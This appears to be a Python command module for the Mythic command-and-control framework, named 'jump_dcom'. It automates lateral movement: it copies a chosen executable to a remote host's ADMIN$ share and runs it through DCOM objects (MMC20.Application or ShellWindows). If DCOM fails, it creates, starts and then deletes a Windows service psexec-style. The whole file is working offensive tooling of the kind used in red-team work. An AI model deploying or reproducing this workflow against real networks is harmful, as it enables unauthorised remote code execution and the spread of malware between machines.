from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import asyncio
import json
import random
import string
import uuid


class JumpDcomArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="target",
                cli_name="Target",
                display_name="Target",
                type=ParameterType.String,
                description="Hostname or IP address of the remote target.",
                parameter_group_info=[ParameterGroupInfo(required=True, ui_position=1)],
            ),
            CommandParameter(
                name="payload",
                cli_name="Payload",
                display_name="Payload",
                type=ParameterType.File,
                description="Executable to upload and run on the remote host.",
                parameter_group_info=[ParameterGroupInfo(required=True, ui_position=2)],
            ),
            CommandParameter(
                name="method",
                cli_name="Method",
                display_name="DCOM Method",
                type=ParameterType.String,
                description="DCOM object to use: mmc20 (MMC20.Application) or shellwindows (ShellWindows). Default: mmc20.",
                default_value="mmc20",
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=3)],
            ),
            CommandParameter(
                name="command",
                cli_name="Command",
                display_name="Extra Arguments",
                type=ParameterType.String,
                description="Optional arguments to append to the uploaded binary.",
                default_value="",
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=4)],
            ),
        ]

    async def parse_arguments(self):
        raise ValueError("Must use the modal or supply named arguments")

    async def parse_dictionary(self, dictionary_arguments):
        self.load_args_from_dictionary(dictionary_arguments)


async def mirror_up_output(task: PTTaskCompletionFunctionMessage):
    response_search = await SendMythicRPCResponseSearch(
        MythicRPCResponseSearchMessage(TaskID=task.SubtaskData.Task.ID)
    )
    if response_search.Success:
        for r in response_search.Responses:
            await SendMythicRPCResponseCreate(
                MythicRPCResponseCreateMessage(
                    TaskID=task.TaskData.Task.ID,
                    Response=r.Response.encode(),
                )
            )
        await SendMythicRPCResponseCreate(
            MythicRPCResponseCreateMessage(
                TaskID=task.TaskData.Task.ID,
                Response="\n".encode(),
            )
        )


async def dcom_callback(task: PTTaskCompletionFunctionMessage) -> PTTaskCompletionFunctionMessageResponse:
    """Waits for dcomexec to complete; falls back to sc (psexec-style) on error."""
    response = PTTaskCompletionFunctionMessageResponse(Success=True, TaskStatus="success", Completed=False)
    await mirror_up_output(task=task)

    if "error" not in task.SubtaskData.Task.Status.lower():
        response.Completed = True
        return response

    # DCOM failed — fall back to service-based execution via sc
    await SendMythicRPCResponseCreate(
        MythicRPCResponseCreateMessage(
            TaskID=task.TaskData.Task.ID,
            Response=b"[!] DCOM execution failed, falling back to sc (psexec-style)...\n",
        )
    )

    target = task.TaskData.args.get_arg("target") or ""
    exec_cmd = task.TaskData.args.get_arg("_lm_exec_cmd") or ""
    service_name = task.TaskData.args.get_arg("_lm_service_name") or ""

    await SendMythicRPCTaskUpdate(
        MythicRPCTaskUpdateMessage(
            TaskID=task.TaskData.Task.ID,
            UpdateStatus="fallback: creating service...",
        )
    )
    await SendMythicRPCTaskCreateSubtask(
        MythicRPCTaskCreateSubtaskMessage(
            TaskID=task.TaskData.Task.ID,
            SubtaskCallbackFunction="fallback_sc_create_callback",
            CommandName="sc",
            Params=json.dumps({
                "create": True,
                "computer": target,
                "service": service_name,
                "binpath": exec_cmd,
                "display_name": service_name,
            }),
        )
    )
    return response


async def fallback_sc_create_callback(task: PTTaskCompletionFunctionMessage) -> PTTaskCompletionFunctionMessageResponse:
    response = PTTaskCompletionFunctionMessageResponse(Success=True, Completed=False)
    await mirror_up_output(task=task)
    if "error" in task.SubtaskData.Task.Status.lower():
        response.TaskStatus = "error: fallback sc create failed"
        response.Completed = True
        return response

    target = task.TaskData.args.get_arg("target") or ""
    service_name = task.TaskData.args.get_arg("_lm_service_name") or ""

    await SendMythicRPCTaskUpdate(
        MythicRPCTaskUpdateMessage(
            TaskID=task.TaskData.Task.ID,
            UpdateStatus="fallback: starting service...",
        )
    )
    await SendMythicRPCTaskCreateSubtask(
        MythicRPCTaskCreateSubtaskMessage(
            TaskID=task.TaskData.Task.ID,
            CommandName="sc",
            Params=json.dumps({
                "start": True,
                "computer": target,
                "service": service_name,
            }),
        )
    )
    await asyncio.sleep(15)
    await SendMythicRPCTaskUpdate(
        MythicRPCTaskUpdateMessage(
            TaskID=task.TaskData.Task.ID,
            UpdateStatus="fallback: deleting service...",
        )
    )
    await SendMythicRPCTaskCreateSubtask(
        MythicRPCTaskCreateSubtaskMessage(
            TaskID=task.TaskData.Task.ID,
            SubtaskCallbackFunction="fallback_sc_delete_callback",
            CommandName="sc",
            Params=json.dumps({
                "delete": True,
                "computer": target,
                "service": service_name,
            }),
        )
    )
    return response


async def fallback_sc_delete_callback(task: PTTaskCompletionFunctionMessage) -> PTTaskCompletionFunctionMessageResponse:
    response = PTTaskCompletionFunctionMessageResponse(Success=True, TaskStatus="success", Completed=True)
    await mirror_up_output(task=task)
    if "error" in task.SubtaskData.Task.Status.lower():
        response.TaskStatus = "error: fallback sc delete failed"
    return response


async def upload_callback(task: PTTaskCompletionFunctionMessage) -> PTTaskCompletionFunctionMessageResponse:
    response = PTTaskCompletionFunctionMessageResponse(Success=True, Completed=False)
    await mirror_up_output(task=task)
    if "error" in task.SubtaskData.Task.Status.lower():
        response.TaskStatus = "error: failed to copy over file"
        response.Completed = True
        return response

    target = task.TaskData.args.get_arg("target") or ""
    method = task.TaskData.args.get_arg("method") or "mmc20"

    params = {
        "command": task.TaskData.args.get_arg("_lm_exec_cmd"),
        "host": target,
        "method": method,
    }

    await SendMythicRPCTaskUpdate(
        MythicRPCTaskUpdateMessage(
            TaskID=task.TaskData.Task.ID,
            UpdateStatus="executing dcom...",
        )
    )
    await SendMythicRPCTaskCreateSubtask(
        MythicRPCTaskCreateSubtaskMessage(
            TaskID=task.TaskData.Task.ID,
            SubtaskCallbackFunction="dcom_callback",
            CommandName="dcomexec",
            Params=json.dumps(params),
        )
    )
    return response


class JumpDcomCommand(CommandBase):
    cmd = "jump_dcom"
    attributes = CommandAttributes(dependencies=["upload", "dcomexec", "sc", "powerchell"])
    needs_admin = False
    help_cmd = "jump_dcom -Target <host> -Payload <file> [-Method mmc20|shellwindows] [-Command <extra args>]"
    description = "Lateral movement workflow: upload payload, then execute via DCOM (MMC20.Application or ShellWindows)."
    version = 1
    script_only = True
    author = "@Lavender-exe"
    argument_class = JumpDcomArguments
    attackmapping = ["T1021.003"]
    completion_functions = {
        "upload_callback": upload_callback,
        "dcom_callback": dcom_callback,
        "fallback_sc_create_callback": fallback_sc_create_callback,
        "fallback_sc_delete_callback": fallback_sc_delete_callback,
    }

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(TaskID=taskData.Task.ID, Success=True)

        target = taskData.args.get_arg("target")
        file_id = taskData.args.get_arg("payload")
        extra_args = taskData.args.get_arg("command") or ""

        rand_name = "".join(random.choices(string.ascii_lowercase + string.digits, k=10)) + ".exe"
        service_name = str(uuid.uuid4())
        remote_unc = f"\\\\{target}\\ADMIN$\\Temp\\{rand_name}"
        exec_cmd = f"C:\\Windows\\Temp\\{rand_name}"
        if extra_args:
            exec_cmd += f" {extra_args}"

        taskData.args.add_arg("_lm_exec_cmd", exec_cmd)
        taskData.args.add_arg("_lm_service_name", service_name)

        response.DisplayParams = f"{target} -> {remote_unc}"
        response.TaskStatus = "uploading file..."

        await SendMythicRPCTaskCreateSubtask(
            MythicRPCTaskCreateSubtaskMessage(
                TaskID=taskData.Task.ID,
                SubtaskCallbackFunction="upload_callback",
                CommandName="upload",
                Params=json.dumps({
                    "remote_path": remote_unc,
                    "file": file_id,
                }),
            )
        )
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
